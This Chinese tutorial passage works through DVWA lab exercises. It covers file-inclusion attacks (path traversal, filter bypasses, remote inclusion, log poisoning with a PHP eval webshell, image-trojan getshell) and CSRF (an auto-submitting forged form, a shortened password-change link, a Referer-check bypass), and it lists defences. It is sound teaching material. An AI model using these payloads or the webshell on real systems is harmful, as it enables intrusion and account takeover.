<div id="outline-container-h:4938e724-4c8e-4d7d-b72d-ef4cde15c2ed" class="outline-3">
<h3 id="h:4938e724-4c8e-4d7d-b72d-ef4cde15c2ed">如何发现文件包含漏洞</h3>
<div class="outline-text-3" id="text-h:4938e724-4c8e-4d7d-b72d-ef4cde15c2ed">
<ol class="org-ol">
<li>观察URL链接是否包括以下类似的关键字： <code>page/include/path/file/link/url</code> 等，如果有，则可能存在文件包含漏洞；</li>
<li>可以观察在URL中，出现的赋值参数等号后跟的信息，是否为一个文件，如果是，则可能存在文件包含漏洞；</li>
<li>在关键字处或明显被文件赋值的参数处，尝试进行赋值，如：<a href="https://www.baidu.com">https://www.baidu.com</a> ；或系统常见文件，如：/etc/passwd（Linux）</li>
<li>配合文件上传漏洞进行验证</li>
<li>扫描器扫</li>
</ol>
</div>
</div>
<div id="outline-container-h:d2a0e099-55e8-43e8-91c7-99f4691d2c7c" class="outline-3">
<h3 id="h:d2a0e099-55e8-43e8-91c7-99f4691d2c7c">DVWA演示</h3>
<div class="outline-text-3" id="text-h:d2a0e099-55e8-43e8-91c7-99f4691d2c7c">
</div>
<div id="outline-container-h:745677e9-676e-4bc7-ad6f-0c3bdd898382" class="outline-4">
<h4 id="h:745677e9-676e-4bc7-ad6f-0c3bdd898382">Low</h4>
<div class="outline-text-4" id="text-h:745677e9-676e-4bc7-ad6f-0c3bdd898382">
<p>
不同难度下的界面都是相同的，可以注意到有file1.php，file2.php，file3.php三个文件。
</p>


<figure id="orgb2a6300">
<img src="./images/img_20230707_004252.png" alt="img_20230707_004252.png" width="50%">

</figure>

<p>
任意点击其中一个文件如file1.php，地址栏的page=include.php就会相应变为page=file1.php，即利用GET的方法来获取服务器中的php文件。
</p>



<figure id="org4f01d96">
<img src="./images/img_20230707_004814.png" alt="img_20230707_004814.png" width="50%">

</figure>

<p>
源码分析得出：直接通过get去传递page参数进行文件包含，没有任何过滤。
</p>

<div class="org-src-container">
<pre class="src src-sh">&lt;?php
// The page we wish to display
$<span style="color: #a0522d;">file</span> = $<span style="color: #a0522d;">_GET</span>[ <span style="color: #8b2252;">'page'</span> ];
?&gt;
</pre>
</div>

<p>
绝对路径和相对路径
</p>
<ol class="org-ol">
<li>绝对路径和相对路径异同点？ 两者的相同之处，在于两者都是对图像，音乐，网址，视频等文件资源的引用方法。 两者的不同之处，在于描述目录路径时，所采用的参考基准点不同。
<ul class="org-ul">
<li>绝对路径：直接指明文件在硬盘上真正存在具体位置或者是以Web站点根目录为参考的完整路径。绝对路径是 规定死的目录，直观清晰，但被网页引用的文件不能随意挪动。当多个网页引用同一个文件时，所使用的路径 都是相同的.</li>
<li>相对路径：舍去磁盘盘符、计算机名等信息，以引用文件的网页所在文件夹位置为参考，建立出的基准根目 录。当保存于不同目录的网页引用同一个文件时，所使用的相对路径不同。</li>
</ul></li>
</ol>


<ol class="org-ol">
<li>在什么情况下使用绝对路径？</li>
</ol>
<p>
通常情况下，只在自己的计算机上对网页进行编辑操作，不拷贝到别的电脑或者服务器，这时可以使用绝对路径。
</p>

<ol class="org-ol">
<li>在什么情况下使用相对路径？</li>
</ol>
<p>
在大多情况下，进行网页编程时，强烈推荐使用相对路径。如果使用绝对路径来指定文件的位置，在自己的计 算机上浏览可能是正常显示，但如果上传到Web服务器上浏览，很有可能因为路径不对，导致图片等文件不能 正常显示。而使用相对路径，可以减少因网页和程序文件存储路径变化，造成的网页不正常显示、程序不正常 运行现象。使用某些网页设计软件引用文件时，会自动使用相对路径，极大的便利了网站管理。
</p>

<p>
尝试获取服务器上的文件内容，输入 <code>../../../../../../ （多少个../都行，越多越好）etc/passwd</code>
</p>



<figure id="org9a5509b">
<img src="./images/img_20230707_005539.png" alt="img_20230707_005539.png" width="50%">

</figure>

<p>
<code>../</code> 返回上级目录，当返回到根目录时候再../还是根目录，然后直接访问Linux系统的passwd文件
也可以尝试包含php.ini，可以看到，现在的页面是在 vulnerabilities/fi/file1.php，如果想要访问
php.ini需要回退两次，可以输入 <code>../../php.ini</code>
</p>



<figure id="org8e12fc2">
<img src="./images/img_20230707_005630.png" alt="img_20230707_005630.png" width="50%">

</figure>



<figure id="org478c718">
<img src="./images/img_20230707_005648.png" alt="img_20230707_005648.png" width="50%">

</figure>

<p>
成功包含到php配置文件
</p>



<figure id="orge741822">
<img src="./images/img_20230707_005723.png" alt="img_20230707_005723.png" width="50%">

</figure>
</div>
</div>
<div id="outline-container-h:8f4ee67c-f163-4733-8bc2-2ef61d1760d3" class="outline-4">
<h4 id="h:8f4ee67c-f163-4733-8bc2-2ef61d1760d3">Medium</h4>
<div class="outline-text-4" id="text-h:8f4ee67c-f163-4733-8bc2-2ef61d1760d3">
<p>
查看源码：
</p>
<div class="org-src-container">
<pre class="src src-sh">&lt;?php 
// The page we wish to display 
$<span style="color: #a0522d;">file</span> = $<span style="color: #a0522d;">_GET</span>[ <span style="color: #8b2252;">'page'</span> ];
// Input validation
$<span style="color: #a0522d;">file</span> = str_replace( array( <span style="color: #8b2252;">"http://"</span>, <span style="color: #8b2252;">"https://"</span> ), <span style="color: #8b2252;">""</span>, $<span style="color: #a0522d;">file</span> );
$<span style="color: #a0522d;">file</span> = str_replace( array( <span style="color: #8b2252;">"../"</span>, <span style="color: #8b2252;">"..\""</span> ), <span style="color: #8b2252;">""</span>, $<span style="color: #a0522d;">file</span> );
?&gt;
</pre>
</div>

<p>
分析：
Medium级别的代码增加了str_replace函数，对page参数进行了一定的过滤，将”<a href="http://">http://</a> ”、”<a href="https://">https://</a>”、
” ../”、”..\“”替换为空字符。
但str_replace函数并不是很安全，双写就可以绕过了。
</p>

<div class="org-src-container">
<pre class="src src-sh">http://127.0.0.1/vulnerabilities/fi/?<span style="color: #a0522d;">page</span>=..././..././..././..././..././etc/passwd
</pre>
</div>



<figure id="org4650256">
<img src="./images/img_20230707_010637.png" alt="img_20230707_010637.png" width="50%">

</figure>

<p>
而且” ../”、”..\”替换为空字符，那么对于绝对路径来讲，是不受任何影响的。
</p>



<figure id="orgeac5cd8">
<img src="./images/img_20230707_010731.png" alt="img_20230707_010731.png" width="50%">

</figure>
</div>
</div>
<div id="outline-container-h:0f1e654b-d432-45e5-8e6e-40f450b196f9" class="outline-4">
<h4 id="h:0f1e654b-d432-45e5-8e6e-40f450b196f9">High</h4>
<div class="outline-text-4" id="text-h:0f1e654b-d432-45e5-8e6e-40f450b196f9">
<p>
查看源码：
</p>

<div class="org-src-container">
<pre class="src src-sh">&lt;?php 
// The page we wish to display 
$<span style="color: #a0522d;">file</span> = $<span style="color: #a0522d;">_GET</span>[ <span style="color: #8b2252;">'page'</span> ];
// Input validation 
<span style="color: #a020f0;">if</span>( !fnmatch( <span style="color: #8b2252;">"file*"</span>, $<span style="color: #a0522d;">file</span> ) &amp;&amp; $<span style="color: #a0522d;">file</span> != <span style="color: #8b2252;">"include.php"</span> ) {
        // This isn<span style="color: #8b2252;">'t the page we want!</span>
<span style="color: #8b2252;">        echo "ERROR: File not found!";</span>
<span style="color: #8b2252;">        exit;</span>
<span style="color: #8b2252;">}</span>
<span style="color: #8b2252;">?&gt;</span>
</pre>
</div>

<p>
可以看到，这里用了fnmatch函数
</p>

<div class="org-src-container">
<pre class="src src-text">fnmatch() &#20989;&#25968;&#26681;&#25454;&#25351;&#23450;&#30340;&#27169;&#24335;&#26469;&#21305;&#37197;&#25991;&#20214;&#21517;&#25110;&#23383;&#31526;&#20018;

&#35821;&#27861;&#65306;
fnmatch(pattern,string,flags)

pattern &#24517;&#38656;&#12290;&#35268;&#23450;&#35201;&#26816;&#32034;&#30340;&#27169;&#24335;&#12290;
string &#24517;&#38656;&#12290;&#35268;&#23450;&#35201;&#26816;&#26597;&#30340;&#23383;&#31526;&#20018;&#25110;&#25991;&#20214;&#12290;
flags &#21487;&#36873;&#12290;
</pre>
</div>

<p>
限制了page参数的开头必须是file，但是可以用<a href="file://协议进行文件读取从而实现绕过">file://协议进行文件读取从而实现绕过</a>
</p>

<div class="org-src-container">
<pre class="src src-sh">http://127.0.0.1/vulnerabilities/fi/?<span style="color: #a0522d;">page</span>=file:///etc/passwd
</pre>
</div>



<figure id="org3c52b41">
<img src="./images/img_20230707_011051.png" alt="img_20230707_011051.png" width="50%">

</figure>
</div>
</div>
<div id="outline-container-h:160e3a13-c2d6-438d-adaa-46345d9fbe85" class="outline-4">
<h4 id="h:160e3a13-c2d6-438d-adaa-46345d9fbe85">Impossible</h4>
<div class="outline-text-4" id="text-h:160e3a13-c2d6-438d-adaa-46345d9fbe85">
<p>
查看源码
</p>
<div class="org-src-container">
<pre class="src src-sh">&lt;?php 
// The page we wish to display
$<span style="color: #a0522d;">file</span> = $<span style="color: #a0522d;">_GET</span>[ <span style="color: #8b2252;">'page'</span> ];
// Only allow include.php or file{1..3}.php
<span style="color: #a020f0;">if</span>( $<span style="color: #a0522d;">file</span> != <span style="color: #8b2252;">"include.php"</span> &amp;&amp; $<span style="color: #a0522d;">file</span> != <span style="color: #8b2252;">"file1.php"</span> &amp;&amp; $<span style="color: #a0522d;">file</span> != <span style="color: #8b2252;">"file2.php"</span> &amp;&amp; $<span style="color: #a0522d;">file</span> != <span style="color: #8b2252;">"file3.php"</span> ) {
        // This isn<span style="color: #8b2252;">'t the page we want! </span>
<span style="color: #8b2252;">        echo "ERROR: File not found!";</span>
<span style="color: #8b2252;">        exit;</span>
<span style="color: #8b2252;">}</span>
<span style="color: #8b2252;">?&gt;</span>
</pre>
</div>

<p>
白名单方式，文件名写死了，其他文件都不可能包含。
</p>
</div>
</div>
</div>
<div id="outline-container-h:5f01c332-5b97-4e2c-b443-b834aca7b541" class="outline-3">
<h3 id="h:5f01c332-5b97-4e2c-b443-b834aca7b541">远程文件包含</h3>
<div class="outline-text-3" id="text-h:5f01c332-5b97-4e2c-b443-b834aca7b541">
<p>
远程文件包含是指包含非被攻击机器上的文件。
此处我们使用dvwa的文件包含漏洞包含 upload-labs 中的文件；
</p>

<ul class="org-ul">
<li>dvwa ip: 172.17.0.3</li>
<li>upload-labs ip: 172.17.0.2</li>
</ul>

<p>
访问 dvwa 的文件包含漏洞，此处我们使用的是 Low 级别
</p>

<p>
page参数改为远程服务器的文件地址；此处注意包含的远程文件不能为php文件, 保证不被远程解析，否则不是在dvwa机
器上执行
</p>

<div class="org-src-container">
<pre class="src src-sh">http://127.0.0.1:8080/vulnerabilities/fi/?<span style="color: #a0522d;">page</span>=http://172.17.0.2/upload/phpinfo.txt
</pre>
</div>


<figure id="org8744d3b">
<img src="./images/img_20230707_011344.png" alt="img_20230707_011344.png" width="50%">

</figure>
</div>
</div>
<div id="outline-container-h:e0f343cc-6b8e-4116-b2f9-f233fbeec697" class="outline-3">
<h3 id="h:e0f343cc-6b8e-4116-b2f9-f233fbeec697">文件包含getshell</h3>
<div class="outline-text-3" id="text-h:e0f343cc-6b8e-4116-b2f9-f233fbeec697">
</div>
<div id="outline-container-h:95a64dae-41a8-433d-96d5-b80e2f40bc0c" class="outline-4">
<h4 id="h:95a64dae-41a8-433d-96d5-b80e2f40bc0c">中间件日志包含绕过</h4>
<div class="outline-text-4" id="text-h:95a64dae-41a8-433d-96d5-b80e2f40bc0c">
<p>
DVWA中，apache2日志文件路径为： /var/log/apache2/access.log
包含日志文件，需要先对文件和目录添加权限，让web端有权限去访问：
</p>

<div class="org-src-container">
<pre class="src src-sh">chmod 755 /var/log/apache2
chmod 644  /var/log/apache2/access.log
</pre>
</div>


<p>
修改完权限之后，访问
</p>

<div class="org-src-container">
<pre class="src src-sh">http://127.0.0.1:8080/vulnerabilities/fi/?<span style="color: #a0522d;">page</span>=/var/log/apache2/access.log
http://127.0.0.1:8080/vulnerabilities/fi/?<span style="color: #a0522d;">page</span>=&lt;?php phpinfo();?&gt;
</pre>
</div>


<p>
因浏览器会进行url编码，使用burp抓包进行修改，将编码字符改为原字符
</p>



<figure id="org91737ea">
<img src="./images/img_20230707_011620.png" alt="img_20230707_011620.png" width="50%">

</figure>

<p>
让access.log 文件记录中包含PHP代码 <code>&lt;?php phpinfo(); ?&gt;</code>
</p>

<p>
之后使用同样的方式写入一句话木马 <code>&lt;?php eval(@$_POST['a']);?&gt;</code> 后，用蚁剑进行连接
</p>

<p>
用蚁剑连接时需要加上cookie
</p>

<ul class="org-ul">
<li>既然能包含文件上传漏洞所上传的图片马，那日志文件是txt，理论上说也能包含(需要日志文件和对应目录具备读写权限)</li>
<li>利用文件包含漏洞去包含日志文件的时候，因为 dvwa 本身需要登录，所以直接包含不成功，需要在蚁剑中添加 cookie，才能包含到。</li>
</ul>
</div>
</div>
</div>
<div id="outline-container-h:a1ab2c00-dad7-4e6b-b6e1-1d65506dfa2d" class="outline-3">
<h3 id="h:a1ab2c00-dad7-4e6b-b6e1-1d65506dfa2d">配合文件上传Getshell</h3>
<div class="outline-text-3" id="text-h:a1ab2c00-dad7-4e6b-b6e1-1d65506dfa2d">
<p>
攻击思路：
</p>
<ol class="org-ol">
<li>把代码+图片合在一起，最终看到还是一个图片，只是这个图片中有代码</li>
<li>上传一个带有代码的jpg图片</li>
<li>以文件包含漏洞来执行图片的php代码</li>
</ol>

<p>
直接在 File Upload 模块上传 muma.jpg ，上传成功，获得上传路径
</p>



<figure id="org21f9204">
<img src="./images/img_20230707_011915.png" alt="img_20230707_011915.png" width="50%">

</figure>


<p>
利用文件包含访问图片码，直接在URL page= 后面输入返回的上传路径即可
</p>


<p>
使用蚁剑进行连接，输入地址：
</p>
<ul class="org-ul">
<li><code>http://127.0.0.1:8080/vulnerabilities/fi/?page=../../hackable/uploads/muma.jpg</code></li>

<li>由于文件包含，需要登录 DVWA ，在未登录的状态下，会导致连接不成功，可以直接把已经登录的Cookie 信息在编辑 shell 配置添加到 Header 头里，这样就可以了</li>
<li>在已经登录 DVWA 页面，按F12 键，获取 Cookie</li>
</ul>
</div>
</div>
<div id="outline-container-h:f6114c46-36e6-45df-b024-7421cac80860" class="outline-3">
<h3 id="h:f6114c46-36e6-45df-b024-7421cac80860">文件包含漏洞防御</h3>
<div class="outline-text-3" id="text-h:f6114c46-36e6-45df-b024-7421cac80860">
<p>
1、设置白名单（文件名可以确定）
2、过滤危险字符（判断文件名称是否为合法的php文件）
3、设置文件目录权限（对可以包含的文件进行限制，可以使用白名单的方式，或者设置可以包含的目录）
4、关闭危险配置（无需远程情况下设置allow_url_include和allow_url_fopen为关闭）
5、严格检查include类的文件包含函数中的参数是否外界可控
</p>
</div>
</div>
</section>
<section id="outline-container-h:675d091f-dfa1-4c3a-980d-858f8e6ea264" class="outline-2">
<h2 id="h:675d091f-dfa1-4c3a-980d-858f8e6ea264">CSRF 攻防</h2>
<div class="outline-text-2" id="text-h:675d091f-dfa1-4c3a-980d-858f8e6ea264">
<p>
主要内容：
</p>
<ul class="org-ul">
<li>CSRF 漏洞概述及原理</li>
<li>CSRF 快速拖库攻击还原</li>
<li>CSRF 管理员密码修改还原</li>
<li>CSRF 进行地址修改及钓鱼攻击还原</li>
<li>CSRF 漏洞安全防范</li>
</ul>
</div>
<div id="outline-container-h:453c8ebd-c527-487c-9bf5-15c834ba5a04" class="outline-3">
<h3 id="h:453c8ebd-c527-487c-9bf5-15c834ba5a04">简介</h3>
<div class="outline-text-3" id="text-h:453c8ebd-c527-487c-9bf5-15c834ba5a04">
<p>
跨站请求伪造（也称 CSRF），是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法，允许攻击者诱导用户执行他们不打算执行的操作。当用户访问含有恶意代码的网页时，会向指定正常网站发送非本人意愿的数据请求包，如果此时用户恰好登录了该正常网站（也就是身份验证是正常的）就会执行该恶意代码的请求，从而造成CSRF漏洞。
</p>

<p>
该漏洞允许攻击者部分规避同源策略，该策略旨在防止不同网站相互干扰。
</p>


<p>
其中Web A为存在CSRF漏洞的网站，Web B为攻击者构建的恶意网站，User C为Web A网站的合法用
户。
</p>

<p>
CSRF攻击原理及过程如下：
</p>
<ol class="org-ol">
<li>用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；</li>
<li>在用户信息经过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送 请求到网站A；</li>
<li>用户未退出网站A之前，在同一浏览器中打开一个TAB页访问网站B；</li>
<li>网站B接受到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；</li>
<li>浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A 发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求， 导致来自网站B的恶意代码被执行。</li>
</ol>



<figure id="org241e871">
<img src="./images/img_20230707_065952.png" alt="img_20230707_065952.png" width="50%">

</figure>

<p>
要使 CSRF 攻击成为可能，必须具备三个关键条件：
</p>
<ul class="org-ul">
<li><b>一个功能操作</b> 。应用程序中存在攻击者有可能诱导用户的操作。这可能是特权操作（例如修改其他用户的权限）或对用户特定数据的任何操作（例如更改用户的邮箱、密码）。</li>
<li><b>基于 Cookie 的会话处理</b> 。执行该操作涉及发出一个或多个 HTTP 请求，并且应用程序仅依赖会话cookie 来识别发出请求的用户，没有其他机制可用于跟踪会话或验证用户请求。</li>
<li><b>没有不可预测的请求参数</b> 。执行该操作的请求不包含攻击者无法确定或猜测其值的任何参数。例如，当用户更改密码时，如果攻击者需要知道现有密码的值，则该功能不会受到攻击，因为攻击者预先构造的恶意链接中无法提前预测并定义“现有密码”的值。</li>
</ul>

<p>
例如，假设一个应用程序包含一个允许用户更改其帐户上的电子邮件地址的功能。当用户执行此操作时，他们会发出如下 HTTP 请求：
</p>

<div class="org-src-container">
<pre class="src src-text">POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=user@xxx.com
</pre>
</div>


<p>
这符合 CSRF 所需的条件：
</p>
<ul class="org-ul">
<li>攻击者对更改用户帐户上的电子邮件地址的操作很感兴趣。执行此操作后，攻击者通常能够触发密码重置并完全控制用户的帐户。</li>
<li>应用程序使用会话 cookie 来识别发出请求的用户。没有其他令牌或机制来跟踪用户会话。</li>
<li>攻击者可以轻松确定执行操作所需的请求参数的值。</li>
</ul>

<p>
有了这些条件，攻击者就可以构建一个包含以下 HTML 的网页：
</p>
<div class="org-src-container">
<pre class="src src-html">&lt;<span style="color: #0000ff;">html</span>&gt;

    &lt;<span style="color: #0000ff;">body</span>&gt;
        &lt;<span style="color: #0000ff;">form</span> <span style="color: #a0522d;">action</span>=<span style="color: #8b2252;">"https://vulnerable-website.com/email/change"</span> <span style="color: #a0522d;">method</span>=<span style="color: #8b2252;">"POST"</span>&gt;
            &lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"hidden"</span> <span style="color: #a0522d;">name</span>=<span style="color: #8b2252;">"email"</span> <span style="color: #a0522d;">value</span>=<span style="color: #8b2252;">"user@xxx.com"</span> /&gt;
        &lt;/<span style="color: #0000ff;">form</span>&gt;
        &lt;<span style="color: #0000ff;">script</span>&gt;
            document.forms[0].submit();
        &lt;/<span style="color: #0000ff;">script</span>&gt;
    &lt;/<span style="color: #0000ff;">body</span>&gt;

&lt;/<span style="color: #0000ff;">html</span>&gt;
</pre>
</div>

<p>
如果受害者用户访问攻击者的网页，将会发生以下情况：
</p>
<ul class="org-ul">
<li>攻击者的页面将触发对易受攻击的网站的 HTTP 请求。</li>
<li>如果用户已经登录到易受攻击的网站，他们的浏览器将自动在请求中包含他们的会话 cookie（假设未使用<a href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions">SameSite cookie</a> ）。</li>
<li>易受攻击的网站将以正常方式处理请求，将其视为由受害者用户发出，并更改其电子邮件地址。</li>
</ul>
</div>
</div>
<div id="outline-container-h:22feadf8-4ec5-4029-a17e-daaa649e9e09" class="outline-3">
<h3 id="h:22feadf8-4ec5-4029-a17e-daaa649e9e09">DVWA演示</h3>
<div class="outline-text-3" id="text-h:22feadf8-4ec5-4029-a17e-daaa649e9e09">
<p>
CSRF
</p>
</div>
<div id="outline-container-h:ee8405a0-8416-413d-aa7e-cec539135229" class="outline-4">
<h4 id="h:ee8405a0-8416-413d-aa7e-cec539135229">Low级别</h4>
<div class="outline-text-4" id="text-h:ee8405a0-8416-413d-aa7e-cec539135229">
<div class="org-src-container">
<pre class="src src-sh">&lt;?php
<span style="color: #a020f0;">if</span>( isset( $<span style="color: #a0522d;">_GET</span>[ <span style="color: #8b2252;">'Change'</span> ] ) ) {
        // Get input
        $<span style="color: #a0522d;">pass_new</span> = $<span style="color: #a0522d;">_GET</span>[ <span style="color: #8b2252;">'password_new'</span> ];
        $<span style="color: #a0522d;">pass_conf</span> = $<span style="color: #a0522d;">_GET</span>[ <span style="color: #8b2252;">'password_conf'</span> ];
        // Do the passwords match?
        <span style="color: #a020f0;">if</span>( $<span style="color: #a0522d;">pass_new</span> == $<span style="color: #a0522d;">pass_conf</span> ) {
                // They<span style="color: #a020f0;"> do</span>!
                $<span style="color: #a0522d;">pass_new</span> = mysql_real_escape_string( $<span style="color: #a0522d;">pass_new</span> );
                $<span style="color: #a0522d;">pass_new</span> = md5( $<span style="color: #a0522d;">pass_new</span> );
                // Update the database
                $<span style="color: #a0522d;">insert</span> = <span style="color: #8b2252;">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> .
                dvwaCurrentUser() <span style="color: #483d8b;">.</span> <span style="color: #8b2252;">"';"</span>;
                $<span style="color: #a0522d;">result</span> = mysql_query( $<span style="color: #a0522d;">insert</span> ) or die( <span style="color: #8b2252;">'&lt;pre&gt;'</span> . mysql_error() <span style="color: #483d8b;">.</span>
                <span style="color: #8b2252;">'&lt;/pre&gt;'</span> );
                // Feedback for the user
                <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;
        } <span style="color: #a020f0;">else</span> {
                // Issue with passwords matching
                <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;
        }
        mysql_close();
}
?&gt;
</pre>
</div>

<p>
从源代码可以看出这里只是对用户输入的两个密码进行判断，看是否相等；不相等就提示密码不匹配。
</p>

<p>
相等的话，查看有没有设置数据库连接的全局变量和其是否为一个对象。如果是的话，用mysqli_real_escape_string（）函数去转义一些字符，如果不是的话输出错误。是同一个对象的话，再用md5进行加密，更新数据库。
</p>

<p>
知道了这些之后，我们尝试修改密码为123456，可以看到修改成功
</p>



<figure id="org46697ad">
<img src="./images/img_20230707_071101.png" alt="img_20230707_071101.png" width="50%">

</figure>


<p>
看到顶部的URL是
</p>
<div class="org-src-container">
<pre class="src src-sh">http://127.0.0.1:8080/vulnerabilities/csrf/?<span style="color: #a0522d;">password_new</span>=123456&amp;<span style="color: #a0522d;">password_conf</span>=123456&amp;<span style="color: #a0522d;">Change</span>=Change#
</pre>
</div>

<p>
根据上面的url，进行构造payload：
</p>

<div class="org-src-container">
<pre class="src src-sh">http://127.0.0.1:8080/vulnerabilities/csrf/?<span style="color: #a0522d;">password_new</span>=aaa&amp;<span style="color: #a0522d;">password_conf</span>=aaa&amp;<span style="color: #a0522d;">Change</span>=Change#
</pre>
</div>

<p>
可以看到，直接跳转到了密码成功的页面了
</p>


<figure id="org1529046">
<img src="./images/img_20230707_071302.png" alt="img_20230707_071302.png" width="50%">

</figure>

<p>
但是，这样的payload，一般人都可以看出来存在陷阱，往往不会去点击，因此我们还需要进一步伪
装，把它缩短。
</p>

<p>
短网址链接：<a href="https://www.ft12.com/">https://www.ft12.com/</a>
</p>

<p>
得到一个短的url：<a href="http://985.so/cycv">http://985.so/cycv</a>
</p>

<p>
提醒一句，以后但凡看见很短的url，然后以很不常见的格式出现，千万别着急点击浏览。
</p>

<p>
点击短网址之后，现在的密码已经变成 aaa，不再是123456
</p>


<figure id="org1b1beaa">
<img src="./images/img_20230707_071423.png" alt="img_20230707_071423.png" width="50%">

</figure>
</div>
</div>
<div id="outline-container-h:fb417e0b-b5aa-407f-a2bc-ae42311910ef" class="outline-4">
<h4 id="h:fb417e0b-b5aa-407f-a2bc-ae42311910ef">Medium级别</h4>
<div class="outline-text-4" id="text-h:fb417e0b-b5aa-407f-a2bc-ae42311910ef">
<div class="org-src-container">
<pre class="src src-sh">docker run -d --name dvwa -p 8080:80 -p 33060:3306 sagikazarmark/dvwa
docker run -d --name dvwa2 -p 8082:80 -p 33062:3306 citizenstig/dvwa <span style="color: #b22222;"># </span><span style="color: #b22222;">csrf Medium &#20195;&#30721;&#19982;&#35838;&#20214;&#23545;&#24212;&#65292;&#29992;&#30340; eregi &#20989;&#25968;&#65292;&#25152;&#20197;&#29992;&#36825;&#20010;</span>
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh">&lt;?php
<span style="color: #a020f0;">if</span>( isset( $<span style="color: #a0522d;">_GET</span>[ <span style="color: #8b2252;">'Change'</span> ] ) ) {
        // Checks to see where the request came from
        <span style="color: #a020f0;">if</span>( eregi( $<span style="color: #a0522d;">_SERVER</span>[ <span style="color: #8b2252;">'SERVER_NAME'</span> ], $<span style="color: #a0522d;">_SERVER</span>[ <span style="color: #8b2252;">'HTTP_REFERER'</span> ] ) ) {
                // Get input
                $<span style="color: #a0522d;">pass_new</span> = $<span style="color: #a0522d;">_GET</span>[ <span style="color: #8b2252;">'password_new'</span> ];
                $<span style="color: #a0522d;">pass_conf</span> = $<span style="color: #a0522d;">_GET</span>[ <span style="color: #8b2252;">'password_conf'</span> ];
                // Do the passwords match?
                <span style="color: #a020f0;">if</span>( $<span style="color: #a0522d;">pass_new</span> == $<span style="color: #a0522d;">pass_conf</span> ) {
                        // They<span style="color: #a020f0;"> do</span>!
                        $<span style="color: #a0522d;">pass_new</span> = mysql_real_escape_string( $<span style="color: #a0522d;">pass_new</span> );
                        $<span style="color: #a0522d;">pass_new</span> = md5( $<span style="color: #a0522d;">pass_new</span> );
                        // Update the database
                        $<span style="color: #a0522d;">insert</span> = <span style="color: #8b2252;">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span>
                        <span style="color: #483d8b;">.</span> dvwaCurrentUser() <span style="color: #483d8b;">.</span> <span style="color: #8b2252;">"';"</span>;
                        $<span style="color: #a0522d;">result</span> = mysql_query( $<span style="color: #a0522d;">insert</span> ) or die( <span style="color: #8b2252;">'&lt;pre&gt;'</span> . mysql_error() <span style="color: #483d8b;">.</span>
                        <span style="color: #8b2252;">'&lt;/pre&gt;'</span> );
                        // Feedback for the user
                        <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;
                } <span style="color: #a020f0;">else</span> {
                        // Issue with passwords matching
                        <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;
                }
        } <span style="color: #a020f0;">else</span> {
                // Didn<span style="color: #8b2252;">'t come from a trusted source</span>
<span style="color: #8b2252;">                echo "&lt;pre&gt;That request didn'</span>t look correct.&lt;/pre&gt;<span style="color: #8b2252;">";</span>
<span style="color: #8b2252;">        }</span>
<span style="color: #8b2252;">        mysql_close();</span>
<span style="color: #8b2252;">}</span>
<span style="color: #8b2252;">?&gt;</span>
</pre>
</div>


<p>
medium类型的代码在 Low 的基础上增加了<a href="https://www.yiibai.com/php/php_eregi.html">eregi</a>函数，函数在一个字符串搜索指定模式的字符串，搜索不区分大小写。在 HTTP 报文中的 REFERER 参数 <code>( $_SERVER[ 'HTTP_REFERER' ] )</code> 中搜索 HOST 参数 <code>( $_SERVER[ 'SERVER_NAME' ] )</code> 。
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #a020f0;">if</span>( eregi( $<span style="color: #a0522d;">_SERVER</span>[ <span style="color: #8b2252;">'SERVER_NAME'</span> ], $<span style="color: #a0522d;">_SERVER</span>[ <span style="color: #8b2252;">'HTTP_REFERER'</span> ] ) )
</pre>
</div>

<ul class="org-ul">
<li>HTTP_REFERER 表示发送请求的来源；</li>
<li>SERVER_NAME 表示配置默认的二级域名，不会是当前的域名；</li>
<li>HTTP_HOST 是当前的 url 头部；</li>
<li>HTTP_HOST = SERVER_NAME : SERVER_PORT</li>
</ul>

<p>
点击修改密码，用brup抓包，将referer中的127.0.0.1去掉
</p>



<figure id="orgdac14b1">
<img src="./images/img_20230707_112000.png" alt="img_20230707_112000.png" width="50%">

</figure>


<p>
结果返回，修改失败；默认不去掉referer的情况下会修改成功。
</p>

<p>
可以设置子域名的方式，攻击者的域名的子域名字符串包含网站域名，这样 Referer 中有了同域名的字符可以绕过php检查。
</p>
</div>
</div>
<div id="outline-container-h:134aa5b2-b768-461a-b0e8-c5022e227d5c" class="outline-4">
<h4 id="h:134aa5b2-b768-461a-b0e8-c5022e227d5c">High级别</h4>
<div class="outline-text-4" id="text-h:134aa5b2-b768-461a-b0e8-c5022e227d5c">
<p>
High级别的代码增加了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端请求。
</p>

<p>
浏览器 f12 查看 CSRF 中，html 的token 是随机变化的。正常情况下是很难绕过的。
</p>



<figure id="orgfb6cb97">
<img src="./images/img_20230714_100546.png" alt="img_20230714_100546.png" width="50%">

</figure>

<p>
抓包可以看到 GET 方法中增加了 token 验证
</p>
<div class="org-src-container">
